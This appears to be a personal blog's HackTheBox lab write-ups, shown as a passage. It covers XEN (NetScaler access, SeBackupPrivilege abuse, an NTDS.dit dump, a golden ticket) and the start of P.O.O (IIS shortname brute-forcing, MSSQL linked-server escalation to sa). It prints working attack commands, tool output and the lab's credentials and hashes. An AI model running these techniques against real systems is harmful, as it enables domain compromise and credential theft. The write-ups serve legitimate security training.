Stopped: Tue May 14 00:30:36 2019 creds mturner / 4install!\nAlthough we are already system at the three VDESKTOP machines, I start poking at CITRIX. The creds from kerberoast are good, but not enough to give a shell.\nproxychains crackmapexec smb 172.16.249.201 -u mturner -p \u0026#39;4install!\u0026#39; ProxyChains-3.1 (http://proxychains.sf.net) SMB 172.16.249.201 445 CITRIX [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True) SMB 172.16.249.201 445 CITRIX [+] htb.local\\mturner:4install! Let’s list the shares on the host:\nC:\\\u0026gt;net view /all \\\\citrix Shared resources at \\\\citrix Share name Type Used as Comment ------------------------------------------------------------------------------- ADMIN$ Disk Remote Admin C$ Disk Default share Citrix$ Disk IPC$ IPC Remote IPC ISOs Disk ISOs-TEST Disk The command completed successfully. on the citrix share, i found a flag.\nC:\\\u0026gt;net use \\\\citrix\\citrix$ /u:mturner 4install! The command completed successfully. C:\\\u0026gt;dir \\\\citrix\\citrix$ Volume in drive \\\\citrix\\citrix$ has no label. Volume Serial Number is 244B-E63F Directory of \\\\citrix\\citrix$ 05/08/2019 06:12 PM \u0026lt;DIR\u0026gt; . 05/08/2019 06:12 PM \u0026lt;DIR\u0026gt; .. 02/12/2019 07:21 PM 997,001 Deploying-XenServer-5.6.pdf 03/31/2019 11:25 AM 20 flag.txt 05/08/2019 06:21 PM 1,486 private.ppk 02/12/2019 07:21 PM 1,747,587 XenServer-5-6-SHG.pdf 4 File(s) 2,746,094 bytes 2 Dir(s) 25,994,129,408 bytes free C:\\\u0026gt;type \\\\citrix\\citrix$\\flag.txt XEN{[REDACTED]} Camouflage # An unprivileged user on the netscaler was not able to drop to shell and it was pretty obvious that this ppk file had to be cracked.\nThis part was frustrating because I couldn’t manage to crack the ppk file for a long time. A keyboard walked wordlist was required.\nClone the repository from here and generate a wordlist based on base chars, keymap and route. https://github.com/hashcat/kwprocessor\n./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route /usr/sbin/putty2john private.ppk \u0026gt; private.ppk.hash john private.ppk.hash --wordlist=/opt/kwprocessor/kw-list-small.txt Password:=-09876567890-=-\nIt can be simply converted to OpenSSH private key,puttygen private.ppk -O private-openssh -o private.rsa\nNow we can ssh. (note that Netscaler’s root user is nsroot)\nproxychains ssh -i ~/id_private_xen.pem nsroot@172.16.249.202 ProxyChains-3.1 (http://proxychains.sf.net) ############################################################################### # # # WARNING: Access to this system is for authorized users only # # Disconnect IMMEDIATELY if you are not an authorized user! # # # ############################################################################### Enter passphrase for key \u0026#39;/root/id_private_xen.pem\u0026#39;: Last login: Wed May 8 23:23:15 2019 from 172.16.249.201 Done \u0026gt; we are still at the netscaler prompt, but this user has access to the shell command\n\u0026gt; shell Copyright (c) 1992-2013 The FreeBSD Project. Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994 The Regents of the University of California. All rights reserved. root@netscaler# This box isn\u0026rsquo;t finished yet. Now we move on to post-exploitation.\nLet\u0026rsquo;s begin by checking the logs\ncd /var/log gunzip -d *.gz cat * | grep XEN $ /login/do_login?LoginType=Explicit\u0026amp;username=cmeller\u0026amp;password=XEN%7Bbu7_ld4p5_15_4_h455l3%7D ^ When I first tried it was on the logs but second time I tried, it wasn\u0026#39;t there. I noticed from the logs that the netscaler-svc service was constantly interacting with the Citrix server and the Netscaler. Monitoring the traffic seemed like a good next step.\ntcpdump -s 65534 -w out.pcap proxychains scp -i private.rsa nsroot@172.16.249.202:/root/out.pcap . wireshark out.cap we got our flag on packet number 10\nThere was also netscaler-svc’s password in the tcpdump capture too. I actually saw this after I finished the lab\nDoppelgänger # At this point, I had already gathered numerous credentials and gained access to most of the boxes.\nWe shouldn\u0026rsquo;t be too far off, right?\nAs the name Doppelgänger suggests, there might be an account using the same password as one of those we\u0026rsquo;ve already found.\nproxychains xfreerdp /v:172.16.249.200 /u:backup-svc /p:'#S3rvice#@cc\nOwned # Running BloodHound might have been a good idea at this point, but everything seemed fairly straightforward, so I opted not to use it. Instead, I focused on the backup-svc user, who had some interesting privileges I could exploit—specifically, the SeBackupPrivilege.\nWith the SeBackupPrivilege, we can create a shadow copy of the OS and access sensitive files like SYSTEM, SECURITY, and NTDS.dit.\nI used the following tool to leverage this privilege: SeBackupPrivilege.\nAfter creating the shadow copy, I mounted it to the G: drive for further exploration.\ndiskshadow.exe set context persistent nowriters add volume C: alias morph3 create expose %morph3% G: To exploit my SeBackupPrivilege, I utilized the DLLs mentioned earlier to enable the privilege.\nImport-Module .\\SeBackupPrivilegeUtils.dll Import-Module .\\SeBackupPrivilegeCmdLets.dll Set-SeBackupPrivilege Copy-FileSeBackupPrivilege \u0026lt;source\u0026gt; \u0026lt;target\u0026gt; To transfer files, I shared 2 directories on both hosts to move back and forth On VDesktop-3 net use R: \\\\172.16.249.200\\C$ /user:backup-svc #S3rvice#@cc On DC net use F: \\\\172.16.249.205\\C$ /user:pmorgan Summer1Summer! I decided to dump the secrets locally on my machine.\npython secretsdump.py -system /root/Desktop/htb/endgame/xen/sixth_flag/SYSTEM -ntds /root/Desktop/htb/endgame/xen/sixth_flag/ntds.dit LOCAL Next we shall get the DC’s ID\n.\\PsGetsid.exe -accepteula \\\\dc.htb.loca We now forge the ticket.\nmimi32.exe kerberos::golden /user:krbtgt /domain:htb.local /krbtgt:3791ca8d70c9e1d2d2c7c5b5c7c253e8 /sid:S-1-5-21-1943675722-3306049422-2153511175 kerberos::ptt ticket.kirbi We can test if it works.\ndir \\\\dc.htb.local\\c$ type \\\\dc.htb.local\\c$\\Users\\Administrator\\Desktop\\flag.txt XEN{[REDACTED]} ","date":"12 October 2024","externalUrl":null,"permalink":"/posts/xen/","section":"Posts","summary":"XEN is an AD lab simulation.","title":"XEN","type":"posts"},{"content":"","date":"7 October 2024","externalUrl":null,"permalink":"/tags/beginner/","section":"Tags","summary":"","title":"Beginner","type":"tags"},{"content":" Machine Info # Professional Offensive Operations By eks and mrb3n Professional Offensive Operations is a rising name in the cyber security world. Lately they\u0026rsquo;ve been working into migrating core services and components to a state of the art cluster which offers cutting edge software and hardware. P.O.O. is designed to put your skills in enumeration, lateral movement, and privilege escalation to the test within a small Active Directory environment that is configured with the latest operating systems and technologies. The goal is to compromise the perimeter host, escalate privileges and ultimately compromise the domain while collecting several flags along the way. Entry Point: 10.13.38.11 Aside from the above, we are to get our foothold onto the macine through a n sql server and pivot our way from there to the admin level.\nEnumeration # We shall start first by seeing if our entry point is accessible by pinging it as seen below.\nOur entry point is accessible, we shall then proceed to scan our IP for open ports using nmap.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ nmap -sCV 10.13.38.11 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 04:23 EAT Nmap scan report for 10.13.38.11 Host is up (0.30s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+ | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-10-06T09:29:44 |_Not valid after: 2054-10-06T09:29:44 | ms-sql-info: | 10.13.38.11:1433: | Version: | name: Microsoft SQL Server 2017 RTM+ | number: 14.00.2056.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: true |_ TCP port: 1433 |_ssl-date: 2024-10-07T01:24:34+00:00; +3s from scanner time. | ms-sql-ntlm-info: | 10.13.38.11:1433: | Target_Name: POO | NetBIOS_Domain_Name: POO | NetBIOS_Computer_Name: COMPATIBILITY | DNS_Domain_Name: intranet.poo | DNS_Computer_Name: COMPATIBILITY.intranet.poo | DNS_Tree_Name: intranet.poo |_ Product_Version: 10.0.17763 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2s, deviation: 0s, median: 2s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.84 seconds As seen above, we have two open ports, 80, 1443. we shall start by seeing what is on port 80\nHTTP Enumeration # We are met with an IIS server page.\nwe shall try to do directory fuzzing to see what directories are available using gobuster. I found some interesting directories, as seen below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.13.38.11:80 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.13.38.11:80 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/images/] /templates (Status: 301) [Size: 155] [--\u0026gt; http://10.13.38.11:80/templates/] /themes (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/themes/] /uploads (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/uploads/] /Images (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/Images/] /admin (Status: 401) [Size: 1293] /plugins (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/plugins/] /dev (Status: 301) [Size: 149] [--\u0026gt; http://10.13.38.11:80/dev/] /js (Status: 301) [Size: 148] [--\u0026gt; http://10.13.38.11:80/js/] /Themes (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/Themes/] Progress: 1786 / 220561 (0.81%)^C [!] Keyboard interrupt detected, terminating. Progress: 1801 / 220561 (0.82%) =============================================================== Finished =============================================================== there is an admin and uploads page, lets try to visit it to see what we can find.\nWe are required to log in but we do not have a clue of any user, however, after trying to log in with the user admin and password as admin, still nothing. Therefore we shall continue with enumeration with a big wordlist to see if we can find anything that is of interest to us, this time I used the wordlist raft-large-words-lowercase.txtI found an interesting directory.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://10.13.38.11:80 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.13.38.11:80 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/images/] /templates (Status: 301) [Size: 155] [--\u0026gt; http://10.13.38.11:80/templates/] /admin (Status: 401) [Size: 1293] /plugins (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/plugins/] /js (Status: 301) [Size: 148] [--\u0026gt; http://10.13.38.11:80/js/] /themes (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/themes/] /uploads (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/uploads/] /dev (Status: 301) [Size: 149] [--\u0026gt; http://10.13.38.11:80/dev/] /. (Status: 200) [Size: 703] /widgets (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/widgets/] /meta-inf (Status: 301) [Size: 154] [--\u0026gt; http://10.13.38.11:80/meta-inf/] /.ds_store (Status: 200) [Size: 10244] Progress: 9547 / 107983 (8.84%)^C [!] Keyboard interrupt detected, terminating. Progress: 9557 / 107983 (8.85%) =============================================================== Finished =============================================================== .ds_store\n.DS_Store Enumeration # .DS_Store files are actually created by MacOS when it visits a directory. They store attributes of the folder and the files within it. Likely here the site was developed on a Mac and then deployed to this Windows server. The structure of the .ds_store file is proprietary, but it has been reversed (see this post for an excellent deep dive).\nI first found the Python-dsstore tool to parse .DS_Store files, then later learned of DS_Walk, which uses dsstore.py to recursively walk a webserver. I will clone the repo and parse it the webserver\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/.ds_store/DS_Walk] └─$ python3 ds_walk.py -u http://10.13.38.11 [!] .ds_store file is present on the webserver. [+] Enumerating directories based on .ds_server file: ---------------------------- [!] http://10.13.38.11/admin [!] http://10.13.38.11/dev [!] http://10.13.38.11/iisstart.htm [!] http://10.13.38.11/Images [!] http://10.13.38.11/JS [!] http://10.13.38.11/META-INF [!] http://10.13.38.11/New folder [!] http://10.13.38.11/New folder (2) [!] http://10.13.38.11/Plugins [!] http://10.13.38.11/Templates [!] http://10.13.38.11/Themes [!] http://10.13.38.11/Uploads [!] http://10.13.38.11/web.config [!] http://10.13.38.11/Widgets ---------------------------- [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1 [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc ---------------------------- [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src ---------------------------- [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src ---------------------------- [!] http://10.13.38.11/Images/buttons [!] http://10.13.38.11/Images/icons [!] http://10.13.38.11/Images/iisstart.png ---------------------------- [!] http://10.13.38.11/JS/custom ---------------------------- [!] http://10.13.38.11/Themes/default ---------------------------- [!] http://10.13.38.11/Widgets/CalendarEvents [!] http://10.13.38.11/Widgets/Framework [!] http://10.13.38.11/Widgets/Menu [!] http://10.13.38.11/Widgets/Notifications ---------------------------- [!] http://10.13.38.11/Widgets/Framework/Layouts ---------------------------- [!] http://10.13.38.11/Widgets/Framework/Layouts/custom [!] http://10.13.38.11/Widgets/Framework/Layouts/default ---------------------------- [*] Finished traversing. No remaining .ds_store files present. [*] Cleaning up .ds_store files saved to disk This gives a pretty clear picture of the directories on the server. One thing that jumped out is the two directories in /dev, both of which look like md5hashes. Some quick guessing shows that they are actually md5 hashes of the two creators, md5(mrb3n) = 304c0c90fbc6520610abbf378e2339d1 and md5(eks) = dca66d38fd916317687e1390a420c3fc.\nIIS Shortnames # A key technique here is to exploit Windows\u0026rsquo; short file names, known as the 8.3 naming convention, which restricts each file name to eight characters followed by a dot and a three-character extension. There was an intriguing paper that explored how earlier versions of IIS and .NET handle these 8.3 file names. The method involves examining how the server deals with 8.3 names that include wildcards, which it appears to process when the tilde (~) symbol is present in the file path.\nDifferent servers may require different HTTP request methods to detect this behavior. On this particular server, the issue doesn’t appear with a GET request, but is exposed using an OPTIONS request. For instance, using gobuster, I found that there is a folder called templates in the root directory. When I send an OPTIONS request to http://10.13.38/11/t*~1*/.aspx, the server responds with a 404 error. However, when I send a request to http://10.13.38/11/c*~1*/.aspx, it responds with a 200 status code.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/c*~1*/.aspx\u0026#39; HTTP/1.1 200 OK Allow: OPTIONS, TRACE, GET, HEAD, POST Server: Microsoft-IIS/10.0 Public: OPTIONS, TRACE, GET, HEAD, POST Date: Mon, 07 Oct 2024 02:11:52 GMT Content-Length: 0 ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/t*~1*/.aspx\u0026#39; HTTP/1.1 404 Not Found Content-Type: text/html Server: Microsoft-IIS/10.0 Date: Mon, 07 Oct 2024 02:12:10 GMT Content-Length: 1245 I tried each character and got the next character to be s, as seen below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/ta*~1*/.aspx\u0026#39; HTTP/1.1 200 OK Allow: OPTIONS, TRACE, GET, HEAD, POST Server: Microsoft-IIS/10.0 Public: OPTIONS, TRACE, GET, HEAD, POST Date: Mon, 07 Oct 2024 02:14:08 GMT Content-Length: 0 ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/tem*~1*/.aspx\u0026#39; HTTP/1.1 404 Not Found Content-Type: text/html Server: Microsoft-IIS/10.0 Date: Mon, 07 Oct 2024 02:14:15 GMT Content-Length: 1245 However, this does not work for all directories / files. It does not find /admin,likely due to permissions. I found a couple of tools to do the brute force. This tool is the one associated with the research paper above, but it’s in Java, so I kept looking and found this Python scanner. When running it on the root directory, it found some of the stuff in it:\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ python3 iis_shortname_scan.py http://10.13.38.11/ Server is vulnerable, please wait, scanning... [+] /d~1.* [scan in progress] [+] /n~1.* [scan in progress] [+] /t~1.* [scan in progress] [+] /w~1.* [scan in progress] [+] /ds~1.* [scan in progress] [+] /ne~1.* [scan in progress] [+] /te~1.* [scan in progress] [+] /tr~1.* [scan in progress] [+] /we~1.* [scan in progress] [+] /ds_~1.* [scan in progress] [+] /new~1.* [scan in progress] [+] /tem~1.* [scan in progress] [+] /tra~1.* [scan in progress] [+] /web~1.* [scan in progress] [+] /ds_s~1.* [scan in progress] [+] /newf~1.* [scan in progress] [+] /temp~1.* [scan in progress] [+] /tras~1.* [scan in progress] [+] /ds_st~1.* [scan in progress] [+] /newfo~1.* [scan in progress] [+] /templ~1.* [scan in progress] [+] /trash~1.* [scan in progress] [+] /ds_sto~1.* [scan in progress] [+] /newfol~1.* [scan in progress] [+] /templa~1.* [scan in progress] [+] /trashe~1.* [scan in progress] [+] /ds_sto~1 [scan in progress] [+] Directory /ds_sto~1 [Done] [+] /newfol~1 [scan in progress] [+] Directory /newfol~1 [Done] [+] /templa~1 [scan in progress] [+] Directory /templa~1 [Done] [+] /trashe~1 [scan in progress] [+] Directory /trashe~1 [Done] ---------------------------------------------------------------- Dir: /ds_sto~1 Dir: /newfol~1 Dir: /templa~1 Dir: /trashe~1 ---------------------------------------------------------------- 4 Directories, 0 Files found in total Note that * is a wildcard, matches any character zero or more times. I\u0026rsquo;m unsure why the script omits the dot before .DS_Store. It classifies it as a directory because, in the 8.3 naming scheme, files without an extension are interpreted as directories.\nWhat\u0026rsquo;s more intriguing is the behavior when I run the script against the /dev directories. At the root, it only detects .DS_Store and the two hash directories that I already know exist. Inside each of the hash directories, it only identifies .DS_Store. Interestingly, it shows that the src, include, and core directories are not vulnerable, but the db directory displays what seems to be the same file in both instances:\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ python3 iis_shortname_scan.py http://10.13.38.11/dev/ Server is vulnerable, please wait, scanning... [+] /dev/d~1.* [scan in progress] [+] /dev/3~1.* [scan in progress] [+] /dev/ds~1.* [scan in progress] [+] /dev/dc~1.* [scan in progress] [+] /dev/30~1.* [scan in progress] [+] /dev/ds_~1.* [scan in progress] [+] /dev/dca~1.* [scan in progress] [+] /dev/304~1.* [scan in progress] [+] /dev/ds_s~1.* [scan in progress] [+] /dev/dca6~1.* [scan in progress] [+] /dev/304c~1.* [scan in progress] [+] /dev/ds_st~1.* [scan in progress] [+] /dev/dca66~1.* [scan in progress] [+] /dev/304c0~1.* [scan in progress] [+] /dev/ds_sto~1.* [scan in progress] [+] /dev/dca66d~1.* [scan in progress] [+] /dev/304c0c~1.* [scan in progress] [+] /dev/ds_sto~1 [scan in progress] [+] Directory /dev/ds_sto~1 [Done] [+] /dev/dca66d~1 [scan in progress] [+] Directory /dev/dca66d~1 [Done] [+] /dev/304c0c~1 [scan in progress] [+] Directory /dev/304c0c~1 [Done] ---------------------------------------------------------------- Dir: /dev/ds_sto~1 Dir: /dev/dca66d~1 Dir: /dev/304c0c~1 ---------------------------------------------------------------- 3 Directories, 0 Files found in total Note that * is a wildcard, matches any character zero or more times. ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ python3 iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db Server is vulnerable, please wait, scanning... [+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [scan in progress] [+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done] ---------------------------------------------------------------- File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* ---------------------------------------------------------------- 0 Directories, 1 Files found in total Note that * is a wildcard, matches any character zero or more times. ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ python3 iis_shortname_scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db Server is vulnerable, please wait, scanning... [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/p~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/po~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_c~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.t* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.tx* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt* [scan in progress] [+] File /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt* [Done] ---------------------------------------------------------------- File: /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt* ---------------------------------------------------------------- 0 Directories, 1 Files found in total Note that * is a wildcard, matches any character zero or more times. File fuzzing # I’m aware of a .txt file in /dev/304c0c90fbc6520610abbf378e2339d1/db/ that begins with poo_co. At this point, I can use wfuzz to try and discover the rest of the filename. To narrow down the search, I’ll extract words starting with \u0026lsquo;co\u0026rsquo; from raft-large-words-lowercase.txt, which generates a relatively compact wordlist to work with:\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ grep \u0026#34;^co\u0026#34; /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt \u0026gt; co_fuzzing.txt ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ wc -l co_fuzzing.txt 2351 co_fuzzing.txt lets try and fuzz now.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ wfuzz -c -w co_fuzzing.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt Total requests: 2351 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000097: 200 6 L 7 W 142 Ch \u0026#34;connection\u0026#34; Total time: 87.84663 Processed Requests: 2351 Filtered Requests: 2350 Requests/sec.: 26.76255 Retrieving this file (from either dev directory) reveals connection details for MSSQL and the first flag, Recon:\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ curl -s http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt SERVER=10.13.38.11 USERID=external_user DBNAME=POO_PUBLIC USERPWD=#p00Public3xt3rnalUs3r# Flag : [REDACTED] Huh?! # MSSQL Enumeration. # Using creds from the previous step, I can now connect to the MSSQL instance on TCP 1433\n┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py external_user:#p00Public3xt3rnalUs3r#@10.13.38.11 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(COMPATIBILITY\\POO_PUBLIC): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(COMPATIBILITY\\POO_PUBLIC): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 88) [!] Press help for extra shell commands SQL (external_user external_user@master)\u0026gt; I can perform basic server enumeration to gather information such as the MSSQL version, user accounts, and admin users:\nSQL (external_user external_user@master)\u0026gt; select @@version; ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- Microsoft SQL Server 2017 (RTM-GDR) (KB5040942) - 14.0.2056.2 (X64) Jun 20 2024 11:02:32 Copyright (C) 2017 Microsoft Corporation Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 \u0026lt;X64\u0026gt; (Build 17763: ) (Hypervisor) SQL (external_user external_user@master)\u0026gt; select name FROM master..syslogins name ------------- sa external_user SQL (external_user external_user@master)\u0026gt; select name FROM master..syslogins WHERE sysadmin = \u0026#39;1\u0026#39;; name ---- sa Although we have found two users, there is one other user, the admin . I can enumerate my privileges to see what activities I can do on the server.\nSQL (external_user external_user@master)\u0026gt; SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;SERVER\u0026#39;); entity_name permission_name ----------- --------------- server CONNECT SQL I can list the databases and find the current one.\nSQL (external_user external_user@master)\u0026gt; SELECT name FROM master..sysdatabases; name ---------- master tempdb POO_PUBLIC SQL\u0026gt; SELECT DB_NAME(); ------------------------------ master I explored the different tables and their columns, but didn’t come across anything significant worth sharing.\nLinked Servers # Enumeration # This article provides a useful guide on how to exploit SQL Server links. An SQL Server link allows an MSSQL server to connect to external data sources, including other MSSQL servers, Oracle databases, Excel workbooks, and more. The link specifies which resources are accessed and under which user account. If not properly configured, this can be exploited.\nSQL (external_user external_user@master)\u0026gt; select @@servername ------------------------ COMPATIBILITY\\POO_PUBLIC To check for linked servers, I’ll query the sysservers table (the article recommends *, but I’ll just show the name for readability):\nSQL (external_user external_user@master)\u0026gt; select srvname from sysservers; srvname ------------------------ COMPATIBILITY\\POO_CONFIG COMPATIBILITY\\POO_PUBLIC There is another linked remote server, POO_CONFIG.\nPOO_CONFIG\nI found EXECUTE, to be much more successful, however, from the article openquery is used to run queries on other servers.\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;select @@servername;\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; ------------------------ COMPATIBILITY\\POO_CONFIG The link is set up to execute commands as the internal_user:\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;select suser_name();\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; ------------- internal_user The user we found is not an admin.\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;select name FROM master..syslogins WHERE sysadmin = \u0026#39;\u0026#39;1\u0026#39;\u0026#39;;\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; name ---- sa SQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;\u0026#39;SERVER\u0026#39;\u0026#39;);\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; entity_name permission_name ----------- --------------- server CONNECT SQL looking at the data in the tables, I found nothing of interest.\nI tried to have POO_CONFIG run a command on POO_PUBLIC and it works as seen below.\nSQL (external_user external_user@master)\u0026gt; EXEC (\u0026#39;EXEC (\u0026#39;\u0026#39;select suser_name();\u0026#39;\u0026#39;) at [COMPATIBILITY\\POO_PUBLIC]\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; -- sa Not only did it succeed, but that command is now being executed as the sa user! This misconfiguration occurs because when the two links between the databases were established, the first link allows any user on POO_PUBLIC to run queries (i.e., commands) on POO_CONFIG as internal_user. The second link must have been configured so that any user on POO_CONFIG can run queries on POO_PUBLIC as sa. This second link may have seemed reasonable to an administrator at the time, as only trusted individuals would have access to the internal POO_PUBLIC. It\u0026rsquo;s easy to overlook the other link.\nNow, when I check my permissions locally on POO_CONFIG with the current user, I find that I have almost no privileges:\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 